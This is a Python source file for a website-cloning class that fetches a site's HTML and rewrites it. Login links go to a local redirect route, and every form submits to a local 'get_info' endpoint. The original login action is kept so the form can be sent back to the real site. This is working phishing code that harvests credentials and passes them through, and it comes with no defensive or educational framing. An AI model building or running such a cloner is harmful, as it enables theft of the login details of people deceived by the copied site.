from requests import get
from requests.exceptions import RequestException
from contextlib import closing
from bs4 import BeautifulSoup
import logging


class SiteDuplicator:

    def __init__(self, url):
        if url[-1] == '/':
            url = url[:-1]
        self.url = url
        self.prev_login_action = None
        self.soup = None
        self.altered_site = None
        self.cLogger = SiteDuplicator.__qualname__

    def generate_duplicated_site(self):
        """
        generates a new html with all actions replaced to redirect to get_info function
        :return: returns true if succeeded to alter the html.
        """
        raw_html = self.get_raw_html()
        if raw_html is None:
            return False
        logging.debug(self.cLogger + " Got raw html data")
        self.soup = BeautifulSoup(raw_html, 'html.parser')  # get content as html
        self.edit_links()
        logging.debug(self.cLogger + " Changed all submit actions")
        return True

    def get_raw_html(self):
        """
        get raw html info from site
        """
        try:
            with closing(get(self.url, stream=True)) as resp:
                if self.is_good_response(resp):
                    return resp.content
                else:
                    logging.error(self.cLogger + " Bad response from server")
                    return None

        except RequestException as e:
            logging.error(self.cLogger + ' Error during requests to {0} : {1}'.format(self.url, str(e)))
            return None

    def edit_links(self):
        """
        sets all forms actions to get info
        sets all login urls to /dup_site
        sets all other urls to original site
        saves the login action url for later sending the form back
        """
        links = self.soup.findAll('a')
        for link in links:
            if link.has_attr('href'):
                if link['href'].__contains__("login"):
                    link['href'] = "/redirect_login/" + ( self.url + "/login").replace('/', "^s^")

                elif not (link['href'].__contains__("http") or link['href'].__contains__("www")):
                    link['href'] = self.url + link['href']

        forms = self.soup.findAll('form')
        for form in forms:
            if form.has_attr('action') and (form['action'].__contains__("login") or form['action'].__contains__("sessions")):
                self.prev_login_action = form['action']
            form['action'] = "http://127.0.0.1:5000/get_info"

    @staticmethod
    def is_good_response(resp):
        """
        Returns true if the response seems to be HTML, false otherwise
        """
        content_type = resp.headers['Content-Type'].lower()
        return (resp.status_code == 200
                and content_type is not None
                and content_type.find('html') > -1)